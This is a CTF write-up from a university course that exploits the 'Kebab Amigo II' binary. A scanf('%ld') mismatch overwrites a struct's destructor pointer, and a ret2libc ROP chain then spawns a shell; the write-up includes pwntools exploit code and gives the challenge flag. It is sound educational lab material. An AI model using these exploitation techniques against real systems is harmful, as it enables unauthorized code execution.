
# Kebab Amigo II | URJC CTF Course

## Challenge Description


> Lo de siempre no amigo?
   
This challenge is part of an organized by students of Universidad Rey Juan Carlos.

### TL;DR

In this challenge we have to abuse wrong `scanf` formatting to overwrite the main struct’s destroy function into a ret2libc.

## Challenge Solution



As always, we start by checking the file’s security measures with ``checksec`` and ``file``

```python

> file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=24b0e2d10c87d

> pwn checksec chall
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

There are no stack canaries, NX enabled (no shellcoding this time), and No PIE.

Let's review the code. The first thing we encounter is this structure ``kebab_amigo_t``

```c
struct kebab_amigo_t{
    char nombre[0x20]; // 32 bytes
    int rating; // 4 bytes
    int saldo_caja; // 4 bytes
    void (*destructor)(); // 8 bytes
} kebab_amigo;
```

Then we find the methods ``_abrir_restaurante()`` to initialize ``kebab_amigo`` structure and ``_cerrar_restaurante`` as a destroy function for the struct.

```c
void _cerrar_restaurante()
{
    puts("Estaba bueno eh, pero te has pasado con el rating.");
    exit(0);
}

void _abrir_restaurante()
{
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    strncpy(kebab_amigo.nombre, "PwnKebab", 0x20);
    kebab_amigo.rating = 0;
    kebab_amigo.saldo_caja = 0;
    kebab_amigo.destructor = &_cerrar_restaurante;
}
```

The program greets us with a restaurant menu, and ask us for an option.

Each one of the options populate or modify the fields in ``kebab_amigo``

1. **Kebab Mixto:** Adds 3 to ``saldo_caja`` and asks for a rating to add up inside the variable. 
2. **Durum Mixto:** The same as before but adds 4 to ``saldo_caja``
3. **Kebab Falafel:** The same as ``kebab_mixto()``
4. **Durum doble con queso:** Adds 5 to ``saldo_caja`` and adds the ``rating`` that you send to it doubled up.
5. **Baklava:** Asks for a number and stores it in ``saldo_caja``.

There’s also a function called ``banhos_turcos()``, it is not called explicitly in the program, but it is defined. We will see it now.

I will link the source code at the start of the post, but now I will only show the functions we are interested in.  ``5. baklava()``,  ``4. durum_doble()`` and ``banhos_turcos()``.

```c
void baklava()
{
    puts("Toma un baklava gratis, encima gratis!");
    puts("Por si quieres dejar propina amigo: ");

    scanf("%ld", &kebab_amigo.saldo_caja);
}
```

We can see in this code snippet that it uses `scanf("%ld", [...])` . This text from the [manpage](https://linux.die.net/man/3/scanf) says: 

> [...]  
>
> ***l***  
> *Indicates either that the conversion will be one of **d**, **i**, **o**, **u**, **x**, **X**, or **n** and the next pointer is a pointer to a long int or unsigned long int (rather than int), or that the conversion will be one of **e**, **f**, or **g** and the next pointer is a pointer to double (rather than float).*
>
> [...]

The function is expecting a long double (8 bytes), and stores it inside ``kebab_amigo.saldo_caja`` which is an integer (4 bytes).

Recalling to the struct ``kebab_amigo_t``

```c
struct kebab_amigo_t{
    char nombre[0x20]; // 32 bytes
    int rating; // 4 bytes
    int saldo_caja; // 4 bytes
    void (*destructor)(); // 8 bytes
} kebab_amigo;
```

``void (*destructor)()`` is right after ``saldo_caja``, meaning that if we send an 8 byte value to ``baklava()``, it will populate its first 4 bytes into ``saldo_caja`` and the other 4 inside ``void(*destructor)()``. But when or how is this function called?

This is our ``main()`` function: 

```c
#define MAX_INT ((unsigned int)pow(2,31)-1)
[...]
int main(int argc, char const *argv[])
{
    _abrir_restaurante();
    printf("-- Bienvenido a %s --", kebab_amigo.nombre);
    while(1){
        switch(_menu()){
            case 1:
                kebab_mixto(); break;
            case 2:
                durum_mixto(); break;
            case 3:
                kebab_falafel(); break;
            case 4:
                durum_doble(); break;
            case 5:
                baklava(); break;
            default: exit(1);
        }
        if((unsigned int)kebab_amigo.rating > MAX_INT){
            kebab_amigo.destructor();
        }
    }
    return 0;
}
```

If at any point, ``kebab_amigo.rating > 2^31 - 1``, the destroy function is called. We have to modify the rating value after overwriting the pointer so it can call ours. We will use the function ``durum_doble()``

```c
void durum_doble()
{
    puts("Boooof, encima doble chaval!");
    if (check(5, SALDO))
        kebab_amigo.saldo_caja += 5;
    
    puts("Que rating le das?");
    int _rating = _read_int();
    if (check(_rating, RATING)){
        puts("Bueno, pues se duplica por ser doble 😎");
        kebab_amigo.rating += (_rating*2);
    }
}
```

> The ``check()`` function checks if ``rating =< 1``
> 

The other functions should work too, but with this one we can do it in one iteration with the line `kebab_amigo.rating += (_rating*2);`

But what can we do with this? Well, we now have control over the pointer that the program is going to execute, we could do a lot of things, but with only 4 bytes to overwrite, the list of possible outcomes is smaller. Let's see ``banhos_turcos()``

```c
void banhos_turcos(){
    char respuesta[100];
    puts("Que haces aqui amigo? Esto es solo para empleados!!");
    read(0, respuesta, 0x100);
}
```

We have a huge buffer overflow in this function.

## Exploitation Stages

### Overwrite destroy function

First of all we have to know the address of our win function ``banhos_turcos()``. We can do this by debugging with GDB or by using objdump.

```bash
❯ objdump -d chall -M intel | grep banhos
0000000000400b37 <banhos_turcos>
```

The payload to send to ``baklava()`` has to be 4 bytes of padding (to fill ``saldo_caja``) and our 4 bytes of address to jump to.

```python
'\xaa\xaa\xaa\xaa' # To fill saldo_caja
'\x37\x0b\x40' # Overwrite 0x400b37 into (*destructor)
```

We will create this helper functions for our exploit

```python
def baklava(buf):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b':', buf)

def durum_doble(buf):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'>', buf)
```

Our first payload should be the bytes we saw before, but as a long, so `0x400b37aaaaaaaa` (18026732223900330 in decimal), let's send this to the program and debug with GDB to see what happens.

```python
pwndbg> dq &kebab_amigo 
00000000006020a0     626162654b6e7750 0000000000000000 # char nombre[0x20]
00000000006020b0     0000000000000000 0000000000000000 # ...
00000000006020c0     aaaaaaaa00000000 0000000000400b37 # (saldo_caja | rating) | (*destructor)
```

We succesfully overwrote it! Now we have to modify the rating with ``durum_doble()`` so it jumps to ``0x400b37 <banhos_turcos>``. 

### Update rating value

To achieve this we just have to send `(MAX_INT - 1) / 2 = 1073741824`

```python

BOF_PROC = 1073741824
FIRST_PAYLOAD = 0x400b37aaaaaaaa # '\xaa\xaa\xaa\xaa\x37\x0b\x40'

[...]
def setup_bof():
    print("[+] Jumping to banhos_turcos()\n")
    baklava(str(FIRST_PAYLOAD).encode())
    durum_doble(str(BOF_PROC).encode())
    print("[*] Done! Send your ROP payload after the prompt! \n")
```

![Untitled](images/Untitled.png)

### Ret2libc

From now we have our typical buffer overflow exploitation path:

1. Overflow the buffer to check the padding until ``rsp``
2. Retrieve ``pop rdi; ret`` and ``ret`` gadgets.
3. Leak ``read@GOT`` via ``puts@PLT``
4. Check libc version in a website such as [libc.rip](https://libc.rip)
5. Overflow the buffer again to call `system("/bin/sh\x00")` 
6. Read the flag

We checked with GDB that the padding is 120 bytes. 

For the gadgets you can use a tool like [ropper](https://github.com/sashs/Ropper) or [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) or using pwntools (I used this way in the script)

```python
> ropper -f chall
[...]
0x0000000000400c93: pop rdi; ret; 
[...]
0x000000000040060e: ret; 
```

To leak ``read@GOT`` we will use the following payload: `<PADDING> + POP_RDI + <read@got address> + puts@PLT + banhos_turcos` (we jump again to ``banhos_turcos`` for the second phase of the exploitation).

> You can check [this blog](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got) for more information about PLT and GOT
> 

```python
def leak():
		# Crafting payload
    buf = b'A' * PADDING
    buf += flat(POP_RDI) + flat(exe.got.read)
    buf += flat(exe.plt.puts)
    buf += flat(exe.sym.banhos_turcos)
    io.send(buf)
    
    # Receive addresses
    io.recvlines(3) # Blank line 
    
    # Parse the leak and use it to get libc base address.
    read_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = read_leak - libc.sym.read
    
    print(f"[*] Leaked read@GOT address! --> 0x{read_leak:02x}")
    print(f"[*] Leaked base@libc address! --> 0x{libc.address:02x}\n")

```

After leaking the address of ``read`` at libc. We can do `read_leak - libc.sym.read` (this contains the offset of `read` inside the library) to get the libc base address. And after checking inside a website like [libc.rip](http://libc.rip) or [libc.blukat.me](http://libc.blukat.me) we can retrieve the libc version. And download it.

![Untitled](images/Untitled%201.png)

Now we just have to craft our last payload to get our shell. The final payload will be: `PADDING + POP_RDI + <address of "/bin/sh" string> + <address of libc.system>` 

To get the address of ``/bin/sh\x00`` we can use pwntools utilities ``next(libc.search(b'/bin/sh\x00'))`` or through the terminal

```bash
❯ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 19604f /bin/sh
```

The string will be in `libc.address + 0x19604f` 

```python
def shell():
    buf = b'A' * PADDING
    buf += flat(POP_RDI) + flat(next(libc.search(b'/bin/sh\x00')))
    buf += flat(libc.sym.system)
    io.send(buf)
    print("[!] Shell! \n")
```

After sending this last payload we have a shell and we can read the flag.

![Untitled](images/Untitled%202.png)

You can find the full exploit [here](solvers/exploit.py)

**SOLVED - flag{c0m0_entra_un_kebab_enc1ma_kebab_chaval}**